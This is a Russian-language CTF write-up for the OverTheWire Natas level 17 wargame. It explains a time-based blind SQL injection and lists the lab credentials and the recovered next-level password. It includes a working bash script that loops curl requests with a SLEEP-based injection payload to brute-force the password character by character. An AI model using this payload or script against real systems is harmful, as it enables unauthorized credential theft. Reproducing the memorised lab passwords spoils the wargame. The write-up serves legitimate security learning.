---
tags:
  - ctf
created: 2026-04-04
---

# `Level [17]` 
> Получение пароля путём time-based blind sql injection

## 🔐 Учётные данные
| Параметр | Значение                                   |
| -------- | ------------------------------------------ |
| Host     | http://natas17.natas.labs.overthewire.org/ |
| Port     |                                            |
| Login    | natas17                                    |
| Password | EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC           |


## 🎯 Цель уровня
- 
## 🎯 Информация

| Инфомарция |     |
| ---------- | --- |
|            |     |
## 📚 Ключевые команды/Техники
| Команда                                                                               | Описание                                                                                                                                                                                                                                             |
| ------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `username=natas18\" AND substring(password,1,$pos)='$password$char' AND SLEEP(1) AND` | username=natas18 что истинна<br>AND после истинны выполняет код дальше<br>substring(password,1,$pos)='$password$char' проверка символа строки с паролем и если он верен, выполняем сон, иначе не сон<br>AND в конце, чтобы запрос всегда был истинна |
|                                                                                       |                                                                                                                                                                                                                                                      |
|                                                                                       |                                                                                                                                                                                                                                                      |

## 💡 Пошаговое решение
| Шаг | Действие                                                             | Команда/Код                                                                           |
| --- | -------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| 1   | написать скрипт который с помощью time-based sql забрутфорсит пароль | `username=natas18\" AND substring(password,1,$pos)='$password$char' AND SLEEP(1) AND` |
| 2   |                                                                      |                                                                                       |
| 3   |                                                                      |                                                                                       |

## 🔍 Результат
Флаг/Пароль: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

## 🚪 Переход
-> [Level_17]

## 🔗 Ссылки
- [Название ресурса](URL)
  


## 🔗 Скрипт 

#BashTime-BasedSQL
#!/bin/bash


auth="natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
url="http://natas17.natas.labs.overthewire.org/"
password=""

for pos in {1..40}
do
    for char in {A..Z} {a..z} {0..9}
    do
        echo "Char: $char Pos: $pos"
        if(curl \
        -u "$auth" \
        -d "username=natas18\" AND BINARY substring(password,1,$pos)= BINARY '$password$char' AND SLEEP(3) AND \"1\"=\"1" \
        $url \
        -o /dev/null \
        -s \
        -w "time_total=%{time_total}\n" | grep "time_total=3.*")

        then
            password=$password$char
            echo "Exist password: $password Pos: $pos"
            break
        fi
            
    done
done
echo "Password: $password"